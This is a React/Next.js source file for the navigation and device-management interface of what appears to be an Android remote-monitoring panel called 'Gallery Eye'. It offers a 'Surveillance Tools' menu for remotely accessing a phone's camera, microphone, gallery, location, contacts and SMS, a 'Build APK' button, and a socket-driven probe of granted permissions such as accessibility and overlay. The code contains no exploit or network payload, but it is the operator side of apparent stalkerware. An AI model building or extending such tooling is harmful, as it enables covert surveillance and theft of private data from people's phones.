"use client";

import React, { useState, useRef, useEffect } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { 
    MessageSquare, Users, Flashlight, Vibrate, 
    Camera, Bell, Mic, Smartphone, Settings, 
    LogOut, ChevronDown, Check, Zap, Crown, Image as ImageIcon, Package, Trash2, CheckCircle2, Circle,
    Building2, X, Shield, ShieldCheck, ShieldX, Clock, Hash, Wifi, WifiOff, RefreshCw, AlertCircle, MapPin,
    Radio, Activity, ExternalLink, ArrowUpRight
} from 'lucide-react';
import Image from 'next/image';
import PlanBadge from './PlanBadge';
import { getCleanDeviceName } from '@/lib/deviceNameHelper';

// ─── Device Settings Modal (Solid 3D Diagnostic Pod) ─────────────────────────
interface DeviceSettingsModalProps {
    device: any;
    socket: any;
    userUuid: string;
    onClose: () => void;
}

function DeviceSettingsModal({ device, socket, userUuid, onClose }: DeviceSettingsModalProps) {
    const [permissions, setPermissions] = useState<Record<string, boolean> | null>(null);
    const [isChecking, setIsChecking] = useState(false);
    const [checked, setChecked] = useState(false);
    const devId = device?.deviceId || device?.id || device?._id;
    const isOnline = !!device?.online;

    // Listen for permission_status once
    useEffect(() => {
        if (!socket) return;
        const handler = (data: any) => {
            if (data?.permissions) {
                setPermissions(data.permissions);
                setIsChecking(false);
                setChecked(true);
            }
        };
        socket.on('permission_status', handler);
        return () => { socket.off('permission_status', handler); };
    }, [socket]);

    const handleCheckPermissions = () => {
        if (!socket || !isOnline || isChecking) return;
        setIsChecking(true);
        setChecked(false);
        setPermissions(null);
        socket.emit('check_permissions', { uuid: userUuid, targetDeviceId: devId });
        // Timeout fallback
        setTimeout(() => {
            setIsChecking(false);
        }, 8000);
    };

    const formatLastSeen = (lastSeen: any) => {
        if (!lastSeen) return 'Unknown';
        const d = new Date(lastSeen);
        if (isNaN(d.getTime())) return 'Unknown';
        const now = new Date();
        const diff = Math.floor((now.getTime() - d.getTime()) / 1000);
        if (diff < 60) return `${diff}s ago`;
        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    const PERMISSION_META: Record<string, { label: string; icon: string; color: string }> = {
        camera: { label: 'Camera', icon: '📷', color: 'cyan' },
        microphone: { label: 'Microphone', icon: '🎙️', color: 'purple' },
        storage: { label: 'Storage / Files', icon: '📂', color: 'amber' },
        contacts: { label: 'Contacts', icon: '👥', color: 'rose' },
        sms: { label: 'SMS & Messages', icon: '💬', color: 'blue' },
        location: { label: 'Location', icon: '📍', color: 'emerald' },
        notifications: { label: 'Notifications', icon: '🔔', color: 'indigo' },
        phone: { label: 'Phone', icon: '📞', color: 'green' },
        overlay: { label: 'Display Overlay', icon: '🖥️', color: 'orange' },
        accessibility: { label: 'Accessibility', icon: '♿', color: 'violet' },
    };

    return typeof document !== 'undefined' ? createPortal(
        <div 
            className="fixed inset-0 z-[400] flex items-center justify-center bg-black/85 backdrop-blur-md p-4 animate-in fade-in duration-150"
            onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
        >
            <div className="bg-[#0f1115] max-w-sm w-full shadow-[0_25px_80px_rgba(0,0,0,0.98)] overflow-hidden border border-white/15 rounded-3xl">
                
                {/* Header */}
                <div className="p-4 sm:p-5 border-b border-white/10 bg-black/50 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className={`clay-icon-pod w-10 h-10 rounded-2xl flex items-center justify-center ${isOnline ? 'text-emerald-400 border-emerald-500/40' : 'text-rose-400 border-rose-500/40'}`}>
                            {isOnline 
                                ? <Wifi className="w-5 h-5" /> 
                                : <WifiOff className="w-5 h-5" />
                            }
                        </div>
                        <div>
                            <div className="text-sm font-black text-white truncate max-w-[180px]">
                                {device?.name || device?.model || device?.deviceName || device?.brand || 'Android Device'}
                            </div>
                            <div className={`text-[10px] font-mono font-bold uppercase tracking-wider flex items-center gap-1.5 ${isOnline ? 'text-emerald-400' : 'text-rose-400'}`}>
                                <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`} />
                                <span>{isOnline ? 'Online' : 'Offline'}</span>
                            </div>
                        </div>
                    </div>
                    <button 
                        onClick={onClose} 
                        className="clay-button-sm w-8 h-8 rounded-xl flex items-center justify-center text-white/60 hover:text-white transition-all cursor-pointer"
                    >
                        <X size={15} />
                    </button>
                </div>

                {/* Device Info */}
                <div className="p-4 sm:p-5 space-y-3">
                    {/* UUID */}
                    <div className="bg-[#16181d] border border-white/10 p-3 rounded-2xl flex items-start gap-3">
                        <Hash className="w-4 h-4 text-orange-400 mt-0.5 shrink-0" />
                        <div className="flex-1 min-w-0">
                            <div className="text-[10px] font-mono font-black text-white/40 uppercase tracking-widest mb-0.5">Device UUID</div>
                            <div className="text-[11px] font-mono text-zinc-300 break-all select-all font-bold">{devId || 'N/A'}</div>
                        </div>
                    </div>

                    {/* Last Online */}
                    <div className="bg-[#16181d] border border-white/10 p-3 rounded-2xl flex items-center gap-3">
                        <Clock className="w-4 h-4 text-orange-400 shrink-0" />
                        <div>
                            <div className="text-[10px] font-mono font-black text-white/40 uppercase tracking-widest mb-0.5">Telemetry Status</div>
                            <div className="text-xs font-mono font-bold text-zinc-200">
                                {isOnline ? (
                                    <span className="text-emerald-400 flex items-center gap-1.5">
                                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse inline-block" />
                                        Active & Connected
                                    </span>
                                ) : formatLastSeen(device?.lastSeen)}
                            </div>
                        </div>
                    </div>

                    {/* Permissions Section */}
                    <div className="bg-[#16181d] border border-white/10 p-3.5 rounded-2xl space-y-3">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <Shield className="w-4 h-4 text-orange-400" />
                                <div className="text-[10px] font-mono font-black text-white/60 uppercase tracking-widest">Hardware Permissions</div>
                            </div>
                        </div>

                        {/* Check button */}
                        <button
                            onClick={handleCheckPermissions}
                            disabled={!isOnline || isChecking}
                            className={`w-full py-2.5 rounded-xl text-xs font-mono font-black uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer ${
                                !isOnline
                                    ? 'bg-white/5 text-white/20 cursor-not-allowed border border-white/5'
                                    : isChecking
                                        ? 'clay-button-sm text-orange-300 cursor-wait'
                                        : 'clay-cta-button shadow-md'
                            }`}
                        >
                            {isChecking ? (
                                <><RefreshCw className="w-3.5 h-3.5 animate-spin" /> Querying Device...</>
                            ) : !isOnline ? (
                                <><WifiOff className="w-3.5 h-3.5" /> Device Offline</>
                            ) : (
                                <><ShieldCheck className="w-3.5 h-3.5" /> Probe Live Permissions</>
                            )}
                        </button>

                        {/* Results */}
                        {checked && permissions && (
                            <div className="grid grid-cols-2 gap-1.5 mt-2 max-h-40 overflow-y-auto custom-scrollbar">
                                {Object.entries(permissions).map(([key, granted]) => {
                                    const meta = PERMISSION_META[key.toLowerCase()] || { label: key, icon: '🔑', color: 'zinc' };
                                    return (
                                        <div
                                            key={key}
                                            className={`flex items-center gap-2 px-2.5 py-1.5 rounded-xl border text-[11px] font-bold ${
                                                granted
                                                    ? 'bg-emerald-500/15 border-emerald-500/40 text-emerald-300'
                                                    : 'bg-rose-500/15 border-rose-500/40 text-rose-300'
                                            }`}
                                        >
                                            <span>{meta.icon}</span>
                                            <span className="truncate">{meta.label}</span>
                                            {granted 
                                                ? <ShieldCheck className="w-3 h-3 ml-auto shrink-0 text-emerald-400" />
                                                : <ShieldX className="w-3 h-3 ml-auto shrink-0 text-rose-400" />
                                            }
                                        </div>
                                    );
                                })}
                            </div>
                        )}

                        {checked && !permissions && (
                            <div className="flex items-center gap-2 text-zinc-400 text-xs py-1">
                                <AlertCircle className="w-4 h-4 text-orange-400" />
                                No permission telemetry received.
                            </div>
                        )}
                    </div>
                </div>
            </div>
        </div>,
        document.body
    ) : null;
}

// ─── Device List (Solid Opaque Surface & No Overlap) ──────────────────────────
function DeviceList({ devices, selectedDeviceId, setSelectedDeviceId, setOpenDropdown, onDeleteDevice, socket, userUuid, onOpenSettings }: any) {
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [selectedForDeletion, setSelectedForDeletion] = useState<Set<string>>(new Set());
    const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);

    const toggleSelection = (deviceId: string) => {
        const newSet = new Set(selectedForDeletion);
        if (newSet.has(deviceId)) newSet.delete(deviceId);
        else newSet.add(deviceId);
        setSelectedForDeletion(newSet);
    };

    const confirmBulkDelete = () => {
        const ids = Array.from(selectedForDeletion);
        onDeleteDevice(ids, true);
        setIsSelectionMode(false);
        setSelectedForDeletion(new Set());
        setShowDeleteConfirm(false);
    };

    return (
        <div className="flex flex-col gap-3">
            <div className="flex items-center justify-between px-1">
                <div className="text-[10px] font-mono font-black text-orange-300 uppercase tracking-widest flex items-center gap-2">
                    <Smartphone size={13} className="text-orange-400" />
                    <span>Active Endpoints</span>
                </div>
                {devices.length > 0 && (
                    <button 
                        onClick={() => { setIsSelectionMode(!isSelectionMode); setSelectedForDeletion(new Set()); }}
                        className={`clay-button-sm px-2.5 py-1 rounded-xl text-[10px] font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
                            isSelectionMode ? 'bg-rose-500/20 border-rose-500/50 text-rose-300' : 'text-white/60 hover:text-white'
                        }`}
                        title={isSelectionMode ? "Cancel Selection" : "Bulk Delete"}
                    >
                        {isSelectionMode ? <Check size={12} /> : <Trash2 size={12} />}
                        <span>{isSelectionMode ? 'Cancel' : 'Manage'}</span>
                    </button>
                )}
            </div>

            {devices.length === 0 ? (
                <div className="p-6 text-center text-white/40 text-xs bg-[#16181d] border border-white/10 rounded-2xl font-mono">
                    No active devices paired yet
                </div>
            ) : (
                <>
                    <div className="flex flex-col gap-2 max-h-[280px] overflow-y-auto pr-1 custom-scrollbar overscroll-contain">
                        {devices.map((device: any) => {
                            const devId = device.deviceId || device.id || device._id;
                            const isSelected = selectedDeviceId === devId;
                            return (
                                <div 
                                    key={devId} 
                                    className={`flex items-center gap-2 p-1.5 rounded-2xl transition-all ${
                                        isSelected && !isSelectionMode
                                            ? 'bg-orange-500/15 border-2 border-orange-500/70 shadow-[0_0_14px_rgba(249,115,22,0.25)]'
                                            : 'bg-[#16181d] border border-white/10 hover:border-white/20'
                                    }`}
                                >
                                    {/* Main Device Click Trigger */}
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isSelectionMode) {
                                                toggleSelection(devId);
                                            } else {
                                                setSelectedDeviceId(devId);
                                                setOpenDropdown(null);
                                            }
                                        }}
                                        className="flex-1 flex items-center justify-between gap-2.5 p-1.5 rounded-xl text-left cursor-pointer min-w-0"
                                    >
                                        <div className="flex items-center gap-2.5 min-w-0">
                                            <div className={`clay-icon-pod w-8 h-8 rounded-xl flex items-center justify-center shrink-0 ${
                                                device.online ? 'text-emerald-400 border-emerald-500/40' : 'text-white/40 border-white/10'
                                            }`}>
                                                <Smartphone size={16} />
                                            </div>
                                            <div className="flex flex-col min-w-0">
                                                <span className="text-xs font-bold text-white truncate max-w-[125px] sm:max-w-[155px]">
                                                    {getCleanDeviceName(device)}
                                                </span>
                                                <div className="flex items-center gap-1 mt-0.5">
                                                    <span className={`w-1.5 h-1.5 rounded-full ${device.online ? 'bg-emerald-400 animate-pulse' : 'bg-white/20'}`} />
                                                    <span className={`text-[9px] font-mono uppercase tracking-wider font-bold ${device.online ? 'text-emerald-400' : 'text-white/40'}`}>
                                                        {device.online ? 'Online' : 'Offline'}
                                                    </span>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Selection Indicators (No Overlap) */}
                                        {isSelectionMode ? (
                                            <div className="shrink-0 mr-1">
                                                {selectedForDeletion.has(devId) ? (
                                                    <CheckCircle2 size={18} className="text-rose-400" />
                                                ) : (
                                                    <Circle size={18} className="text-white/20" />
                                                )}
                                            </div>
                                        ) : isSelected && (
                                            <div className="w-5 h-5 rounded-full bg-orange-500/20 border border-orange-500/50 flex items-center justify-center text-orange-400 shrink-0 mr-1">
                                                <Check size={11} />
                                            </div>
                                        )}
                                    </button>

                                    {/* Dedicated Settings Button */}
                                    {!isSelectionMode && (
                                        <button
                                            type="button"
                                            onClick={(e) => {
                                                e.stopPropagation();
                                                onOpenSettings(device);
                                                setOpenDropdown(null);
                                            }}
                                            title="Device Settings & Diagnostics"
                                            className="clay-button-sm w-7 h-7 rounded-lg flex items-center justify-center text-white/50 hover:text-orange-300 transition-all cursor-pointer shrink-0"
                                        >
                                            <Settings size={13} />
                                        </button>
                                    )}
                                </div>
                            );
                        })}
                    </div>

                    {isSelectionMode && selectedForDeletion.size > 0 && (
                        <button 
                            onClick={() => setShowDeleteConfirm(true)}
                            className="mt-1 w-full py-2.5 rounded-xl bg-rose-500 hover:bg-rose-600 text-white font-mono font-bold text-xs shadow-[0_0_16px_rgba(244,63,94,0.4)] transition-all flex items-center justify-center gap-2 cursor-pointer"
                        >
                            <Trash2 size={14} /> Delete Selected ({selectedForDeletion.size})
                        </button>
                    )}
                </>
            )}

            {showDeleteConfirm && typeof document !== 'undefined' && createPortal(
                <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/85 backdrop-blur-md p-4 animate-in fade-in duration-150">
                    <div className="bg-[#0f1115] border border-rose-500/30 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-4 shadow-2xl">
                        <div className="flex items-center gap-3">
                            <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-rose-400 border-rose-500/40">
                                <Trash2 size={18} />
                            </div>
                            <div>
                                <h3 className="font-bold text-white text-sm">Delete Device Endpoints</h3>
                                <p className="text-[10px] text-white/40 font-mono">Irreversible Action</p>
                            </div>
                        </div>
                        <p className="text-xs text-white/70 font-sans leading-relaxed">
                            Are you sure you want to remove <strong className="text-white">{selectedForDeletion.size}</strong> device(s)? This will delete cached sync data.
                        </p>
                        <div className="flex items-center gap-2.5 pt-1">
                            <button
                                onClick={() => setShowDeleteConfirm(false)}
                                className="bg-[#16181d] border border-white/10 hover:bg-white/10 flex-1 py-2 rounded-xl text-white/60 hover:text-white font-mono font-bold text-xs transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={confirmBulkDelete}
                                className="bg-rose-500 hover:bg-rose-600 flex-1 py-2 rounded-xl text-white font-mono font-black text-xs shadow-lg transition-all cursor-pointer border border-rose-400/40"
                            >
                                Confirm Delete
                            </button>
                        </div>
                    </div>
                </div>,
                document.body
            )}
        </div>
    );
}

interface AppNavigationProps {
    devices: any[];
    selectedDeviceId: string | null;
    setSelectedDeviceId: (id: string) => void;
    selectedTool: string | null;
    setSelectedTool: (tool: string | null) => void;
    userPlan: 'basic' | 'standard' | 'premium' | 'enterprise';
    setShowPlansModal: (show: boolean) => void;
    handleSignOut: () => void;
    onOpenAppModal: () => void;
    onDeleteDevice: (deviceId: string) => void;
    user?: any;
    openDropdownProp?: 'tools' | 'devices' | 'profile' | null;
    setOpenDropdownProp?: (val: 'tools' | 'devices' | 'profile' | null) => void;
    socket?: any;
    userUuid?: string;
}

export default function AppNavigation({ 
    devices, selectedDeviceId, setSelectedDeviceId, selectedTool, setSelectedTool, 
    userPlan, setShowPlansModal, handleSignOut, onOpenAppModal, onDeleteDevice, user,
    openDropdownProp, setOpenDropdownProp, socket, userUuid
}: AppNavigationProps) {
    const [internalDropdown, setInternalDropdown] = useState<'tools' | 'devices' | 'profile' | null>(null);
    const [settingsDevice, setSettingsDevice] = useState<any>(null);
    const openDropdown = openDropdownProp !== undefined ? openDropdownProp : internalDropdown;
    const setOpenDropdown = (val: 'tools' | 'devices' | 'profile' | null) => {
        if (setOpenDropdownProp) setOpenDropdownProp(val);
        setInternalDropdown(val);
    };
    const navRef = useRef<HTMLDivElement>(null);

    // Sort devices: online first
    const sortedDevices = [...devices].sort((a, b) => {
        if (a.online === b.online) return 0;
        return a.online ? -1 : 1;
    });

    const onlineDevices = sortedDevices.filter(d => d.online);
    const selectedDevice = sortedDevices.find(d => (d.deviceId || d.id || d._id) === selectedDeviceId);

    // Auto-select online device if no device is selected OR current selection is offline
    useEffect(() => {
        const currentIsOnline = sortedDevices.some(d => (d.deviceId || d.id || d._id) === selectedDeviceId && d.online);
        if (!currentIsOnline && onlineDevices.length > 0) {
            const firstOnlineId = onlineDevices[0].deviceId || onlineDevices[0].id || onlineDevices[0]._id;
            if (firstOnlineId && firstOnlineId !== selectedDeviceId) {
                setSelectedDeviceId(firstOnlineId);
            }
        }
    }, [onlineDevices, selectedDeviceId, setSelectedDeviceId, sortedDevices]);

    // Close dropdowns on click outside
    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            if (openDropdown !== null && navRef.current && !navRef.current.contains(event.target as Node)) {
                setOpenDropdown(null);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, [openDropdown, openDropdownProp, setOpenDropdownProp]);

    const backdropPortal = openDropdown !== null && typeof window !== 'undefined' 
        ? createPortal(
            <div 
                className="fixed inset-0 z-[90] pointer-events-auto cursor-default bg-black/30 transition-opacity" 
                onClick={(e) => {
                    e.stopPropagation();
                    setOpenDropdown(null);
                }} 
            />, 
            document.body
        ) 
        : null;

    const tools = [
        { id: 'gallery', label: 'Gallery', icon: ImageIcon, color: 'text-emerald-400' },
        { id: 'camera', label: 'Camera', icon: Camera, color: 'text-cyan-400' },
        { id: 'audio', label: 'Microphone', icon: Mic, color: 'text-purple-400' },
        { id: 'notifications', label: 'Alerts', icon: Bell, color: 'text-sky-400' },
        { id: 'flashlight', label: 'Flashlight', icon: Flashlight, color: 'text-amber-400' },
        { id: 'vibration', label: 'Vibration', icon: Vibrate, color: 'text-orange-400' },
        { id: 'location', label: 'Location', icon: MapPin, color: 'text-rose-400' },
        { id: 'contacts', label: 'Contacts', icon: Users, color: 'text-green-400' },
        { id: 'sms', label: 'SMS & Texts', icon: MessageSquare, color: 'text-rose-400' }
    ];

    const currentToolData = tools.find(t => t.id === selectedTool);
    const ToolIcon = currentToolData?.icon || Zap;
    const toolLabel = currentToolData?.label || 'Tools';

    const toggleDropdown = (menu: 'tools' | 'devices' | 'profile') => {
        setOpenDropdown(openDropdown === menu ? null : menu);
    };

    const handleSelectTool = (toolId: string) => {
        if (toolId !== selectedTool && typeof window !== 'undefined') {
            const targetPath = toolId === 'audio' ? '/voice' : `/${toolId}`;
            window.history.pushState({ tool: toolId }, '', targetPath);
        }
        setSelectedTool(toolId);
        setOpenDropdown(null);
    };

    // Smooth, instant dropdown animations (Zero lag, zero stuck)
    const dropdownVariants = {
        hidden: { opacity: 0, y: -4 },
        visible: { opacity: 1, y: 0, transition: { duration: 0.12, ease: "easeOut" } as any },
        exit: { opacity: 0, y: -4, transition: { duration: 0.08, ease: "easeIn" } as any }
    };

    // ── Plan-based logo glow ──
    const logoGlowClass = 
        userPlan === 'enterprise'
            ? 'border-purple-500/50 shadow-[0_0_20px_rgba(147,51,234,0.6)]'
        : userPlan === 'premium' 
            ? 'border-amber-500/50 shadow-[0_0_18px_rgba(245,158,11,0.6)]' 
            : userPlan === 'standard'
            ? 'border-emerald-500/50 shadow-[0_0_15px_rgba(16,185,129,0.5)]'
            : 'border-white/15 shadow-md';

    const avatarRingClass =
        userPlan === 'enterprise' ? 'ring-purple-400 shadow-[0_0_20px_rgba(147,51,234,0.6)]' :
        userPlan === 'premium' ? 'ring-amber-400 shadow-[0_0_18px_rgba(245,158,11,0.6)]' :
        userPlan === 'standard' ? 'ring-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.5)]' :
        'ring-zinc-600 shadow-md';

    return (
        <>
            {backdropPortal}
            <div ref={navRef} className="fixed top-0 left-0 right-0 z-[100] px-2 sm:px-4 py-2 sm:py-2.5 md:px-8 pointer-events-none">
                <nav className="max-w-7xl mx-auto flex items-center justify-between bg-[#101216] rounded-2xl p-1.5 sm:p-2 px-2.5 sm:px-4 shadow-[0_15px_40px_rgba(0,0,0,0.85)] border border-white/10 pointer-events-auto">
                    
                    {/* Logo (Click to return to Master Dashboard) */}
                    <button
                        type="button"
                        onClick={() => {
                            setSelectedTool(null);
                            if (typeof window !== 'undefined') {
                                window.history.pushState(null, '', '/');
                            }
                        }}
                        title="Back to System Dashboard"
                        aria-label="Return to System Dashboard"
                        className="flex items-center shrink-0 group cursor-pointer active:scale-95 transition-transform focus:outline-none"
                    >
                        <div className={`w-8 h-8 sm:w-9 sm:h-9 rounded-xl shrink-0 aspect-square flex items-center justify-center relative overflow-hidden transition-all duration-300 group-hover:scale-105 border ${logoGlowClass}`}>
                            <img src="/gallery-eye-logo.jpg" alt="Gallery Eye" className="w-full h-full object-cover z-10 block" />
                        </div>
                    </button>

                    <div className="flex items-center gap-1.5 sm:gap-2.5 flex-1 justify-end">
                        
                        {/* 1. Tools Dropdown Button (Name Visible on BOTH Mobile & Desktop) */}
                        <div className="relative">
                            <button 
                                id="tutorial-tools-selector"
                                onClick={() => toggleDropdown('tools')}
                                className={`clay-capsule flex items-center gap-1.5 sm:gap-2 px-2 sm:px-3.5 py-1.5 sm:py-2 rounded-xl transition-all cursor-pointer ${
                                    openDropdown === 'tools' || selectedTool 
                                        ? 'border-orange-500/70 bg-orange-500/15 text-orange-300 shadow-[0_0_14px_rgba(249,115,22,0.25)]' 
                                        : 'text-white/70 hover:text-white'
                                }`}
                            >
                                <ToolIcon className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-orange-400 shrink-0" />
                                <span className="font-bold text-[11px] sm:text-xs max-w-[55px] sm:max-w-none truncate block">
                                    {toolLabel}
                                </span>
                                <ChevronDown className={`w-3 h-3 sm:w-3.5 sm:h-3.5 transition-transform duration-200 text-white/50 shrink-0 ${openDropdown === 'tools' ? 'rotate-180' : ''}`} />
                            </button>

                            <AnimatePresence>
                                {openDropdown === 'tools' && (
                                    <motion.div
                                        variants={dropdownVariants}
                                        initial="hidden"
                                        animate="visible"
                                        exit="exit"
                                        className="fixed left-3 right-3 top-[65px] w-auto sm:absolute sm:top-[125%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:w-[380px] p-4 sm:p-5 bg-[#0f1115] rounded-3xl border border-white/15 z-[200] pointer-events-auto cursor-default shadow-[0_25px_70px_rgba(0,0,0,0.98)]"
                                    >
                                        <div className="flex items-center justify-between mb-3 px-1">
                                            <span className="text-[10px] font-mono font-black text-orange-300 uppercase tracking-widest flex items-center gap-1.5">
                                                <Activity size={12} className="text-orange-400" />
                                                <span>Surveillance Tools</span>
                                            </span>
                                            <span className="text-[9px] font-mono text-white/40">Select tool to launch</span>
                                        </div>

                                        <div className="grid grid-cols-3 gap-2">
                                            {tools.map((tool) => {
                                                const isSelected = selectedTool === tool.id;
                                                const Icon = tool.icon;
                                                return (
                                                    <button
                                                        key={tool.id}
                                                        onClick={() => handleSelectTool(tool.id)}
                                                        className={`p-2.5 rounded-2xl flex flex-col items-center justify-center gap-1.5 transition-all text-center cursor-pointer group ${
                                                            isSelected 
                                                                ? 'bg-orange-500/15 border-2 border-orange-500/70 shadow-[0_0_16px_rgba(249,115,22,0.25)]' 
                                                                : 'bg-[#16181d] border border-white/10 hover:border-white/20'
                                                        }`}
                                                    >
                                                        <div className={`clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center group-hover:scale-105 transition-transform ${tool.color}`}>
                                                            <Icon size={17} />
                                                        </div>
                                                        <span className={`text-[11px] font-bold truncate w-full ${isSelected ? 'text-orange-300 font-black' : 'text-white/70 group-hover:text-white'}`}>
                                                            {tool.label}
                                                        </span>
                                                    </button>
                                                );
                                            })}
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>

                        {/* 2. Devices Dropdown Button (Name Visible on BOTH Mobile & Desktop) */}
                        <div className="relative">
                            <button 
                                id="tutorial-device-selector"
                                onClick={() => toggleDropdown('devices')}
                                className={`clay-capsule flex items-center gap-1.5 sm:gap-2 px-2 sm:px-3.5 py-1.5 sm:py-2 rounded-xl transition-all cursor-pointer ${
                                    openDropdown === 'devices' 
                                        ? 'border-orange-500/70 bg-orange-500/15 text-orange-300 shadow-[0_0_14px_rgba(249,115,22,0.25)]' 
                                        : 'text-white/70 hover:text-white'
                                }`}
                            >
                                <div className="relative flex items-center justify-center shrink-0">
                                    <Smartphone className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-orange-400" />
                                    <div className={`absolute -bottom-0.5 -right-0.5 w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full border border-black ${
                                        selectedDevice?.online 
                                            ? 'bg-emerald-500 shadow-[0_0_6px_#10b981]' 
                                            : (selectedDevice ? 'bg-rose-500' : (sortedDevices.some(d => d.online) ? 'bg-emerald-500 shadow-[0_0_6px_#10b981]' : 'bg-rose-500'))
                                    }`} />
                                </div>
                                <span className="font-bold text-[11px] sm:text-xs max-w-[65px] sm:max-w-[130px] truncate block">
                                    {selectedDevice ? getCleanDeviceName(selectedDevice) : 'Devices'}
                                </span>
                                <ChevronDown className={`w-3 h-3 sm:w-3.5 sm:h-3.5 transition-transform duration-200 text-white/50 shrink-0 ${openDropdown === 'devices' ? 'rotate-180' : ''}`} />
                            </button>

                            <AnimatePresence>
                                {openDropdown === 'devices' && (
                                    <motion.div
                                        variants={dropdownVariants}
                                        initial="hidden"
                                        animate="visible"
                                        exit="exit"
                                        className="fixed left-3 right-3 top-[65px] w-auto sm:absolute sm:top-[125%] sm:left-1/2 sm:right-auto sm:-translate-x-1/2 sm:w-[360px] p-4 sm:p-5 bg-[#0f1115] rounded-3xl border border-white/15 z-[200] pointer-events-auto cursor-default shadow-[0_25px_70px_rgba(0,0,0,0.98)]"
                                    >
                                        <DeviceList 
                                            devices={sortedDevices} 
                                            selectedDeviceId={selectedDeviceId} 
                                            setSelectedDeviceId={setSelectedDeviceId} 
                                            setOpenDropdown={setOpenDropdown} 
                                            onDeleteDevice={onDeleteDevice}
                                            socket={socket}
                                            userUuid={userUuid}
                                            onOpenSettings={(dev: any) => setSettingsDevice(dev)}
                                        />
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>

                        {/* Divider */}
                        <div className="w-px h-5 sm:h-6 bg-white/10 mx-0.5" />

                        {/* 3. Build APK Button */}
                        <button 
                            id="tutorial-access-app-nav"
                            onClick={onOpenAppModal}
                            className="clay-capsule flex items-center gap-1.5 px-2 sm:px-3.5 py-1.5 sm:py-2 rounded-xl text-orange-400 hover:text-orange-300 font-black text-[11px] sm:text-xs border-orange-500/30 bg-orange-500/10 shadow-[0_0_12px_rgba(249,115,22,0.2)] transition-all cursor-pointer active:scale-95"
                        >
                            <Package className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-orange-400 shrink-0" />
                            <span className="hidden sm:block font-mono uppercase tracking-wider">Build APK</span>
                        </button>

                        {/* 4. Profile Dropdown Button */}
                        <div className="relative">
                            <button 
                                id="tutorial-account-btn"
                                onClick={() => toggleDropdown('profile')}
                                className={`clay-capsule flex items-center justify-center p-1.5 sm:px-3 sm:py-2 rounded-xl transition-all cursor-pointer ${
                                    openDropdown === 'profile' 
                                        ? 'border-orange-500/70 bg-orange-500/15 text-orange-300' 
                                        : 'text-white/70 hover:text-white'
                                }`}
                            >
                                <Settings className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white/70" />
                                <span className="hidden md:block font-bold text-xs ml-1.5">Account</span>
                            </button>

                            <AnimatePresence>
                                {openDropdown === 'profile' && (
                                    <motion.div
                                        variants={dropdownVariants}
                                        initial="hidden"
                                        animate="visible"
                                        exit="exit"
                                        className="fixed left-3 right-3 top-[65px] w-auto sm:absolute sm:top-[125%] sm:right-0 sm:left-auto sm:w-[290px] p-4 sm:p-5 bg-[#0f1115] rounded-3xl border border-white/15 z-[200] pointer-events-auto cursor-default shadow-[0_25px_70px_rgba(0,0,0,0.98)]"
                                    >
                                        <div className="p-3.5 mb-3 rounded-2xl bg-[#16181d] border border-white/10 flex flex-col items-center text-center">
                                            <div className={`w-14 h-14 rounded-full mb-2.5 flex items-center justify-center overflow-hidden ring-2 ${avatarRingClass}`}>
                                                {user?.image ? (
                                                    <img src={user.image} alt="Profile" className="w-full h-full object-cover" />
                                                ) : (
                                                    <img src="/gallery-eye-logo.jpg" alt="Profile" className="w-full h-full object-cover" />
                                                )}
                                            </div>
                                            {user?.email ? (
                                                <div className="text-xs font-bold text-white font-mono tracking-tight truncate max-w-[220px]" title={user.email}>
                                                    {user.email}
                                                </div>
                                            ) : (
                                                <div className="text-xs font-bold text-white font-mono tracking-tight">
                                                    Account Profile
                                                </div>
                                            )}
                                            <div className="mt-2 w-full flex justify-center">
                                                <PlanBadge plan={userPlan} />
                                            </div>
                                        </div>
                                        
                                        <div className="flex flex-col gap-2">
                                            <button 
                                                onClick={() => { setShowPlansModal(true); setOpenDropdown(null); }}
                                                className="bg-[#16181d] border border-white/10 hover:border-orange-500/40 flex items-center gap-2.5 p-2.5 rounded-xl transition-all text-orange-300 cursor-pointer"
                                            >
                                                <Crown className="w-4 h-4 text-orange-400" />
                                                <span className="text-xs font-bold font-mono uppercase tracking-wider">Upgrade Tier</span>
                                            </button>

                                            <button 
                                                onClick={() => { handleSignOut(); setOpenDropdown(null); }}
                                                className="bg-[#16181d] border border-white/10 hover:border-rose-500/40 flex items-center gap-2.5 p-2.5 rounded-xl transition-all text-rose-400 cursor-pointer"
                                            >
                                                <LogOut className="w-4 h-4 text-rose-400" />
                                                <span className="text-xs font-bold font-mono uppercase tracking-wider">Sign Out</span>
                                            </button>
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>

                    </div>
                </nav>
            </div>

            {/* Device Settings & Permissions Modal */}
